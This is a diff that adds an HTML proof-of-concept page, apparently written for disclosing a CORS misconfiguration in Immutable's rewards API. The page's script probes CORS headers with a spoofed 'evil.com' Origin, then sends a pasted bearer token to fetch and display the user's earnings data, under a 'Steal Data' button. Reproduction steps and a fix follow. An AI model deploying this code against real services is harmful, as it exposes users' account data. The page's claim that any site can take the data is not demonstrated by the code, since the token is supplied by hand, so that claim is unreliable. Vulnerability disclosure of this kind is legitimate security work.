@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head><title>CORS PoC</title></head>
+<body>
+<h1>Immutable CORS Exploit PoC</h1>
+<p>This malicious page steals user data from Immutable API.</p>
+
+<h2>1. Check CORS Misconfiguration</h2>
+<button onclick="checkCORS()">Check CORS</button>
+<pre id="corsResult"></pre>
+
+<h2>2. Steal User Data</h2>
+<p>Paste a valid JWT token (from DevTools Network tab):</p>
+<textarea id="token" rows="3" cols="80" placeholder="Bearer token..."></textarea><br>
+<button onclick="stealData()">Steal Data</button>
+<pre id="dataResult"></pre>
+
+<script>
+async function checkCORS() {
+    const res = await fetch('https://api.immutable.com/v2/rewards/earnings', {method: 'OPTIONS', headers: {'Origin': 'https://evil.com'}});
+    const headers = `access-control-allow-origin: ${res.headers.get('access-control-allow-origin')}
+access-control-allow-headers: ${res.headers.get('access-control-allow-headers')}
+access-control-expose-headers: ${res.headers.get('access-control-expose-headers')}`;
+    document.getElementById('corsResult').textContent = headers;
+}
+
+async function stealData() {
+    const token = document.getElementById('token').value.trim();
+    if (!token) return alert('Paste token first');
+    
+    const res = await fetch('https://api.immutable.com/v2/rewards/earnings', {
+        headers: {'Authorization': 'Bearer ' + token, 'Origin': 'https://evil.com'}
+    });
+    const data = await res.json();
+    document.getElementById('dataResult').textContent = JSON.stringify(data, null, 2);
+}
+</script>
+
+<h2>How to reproduce:</h2>
+<ol>
+<li>Login to play.immutable.com</li>
+<li>Open DevTools → Network tab</li>
+<li>Find any API request, copy the "Authorization: Bearer ..." header value</li>
+<li>Paste token above and click "Steal Data"</li>
+<li>See your personal earnings data returned (if token valid)</li>
+</ol>
+
+<p><b>Impact:</b> Any website can steal your Immutable data if you visit it while logged in.</p>
+<p><b>Fix:</b> Remove <code>access-control-allow-origin: *</code> from authenticated endpoints.</p>
+</body>
+</html>
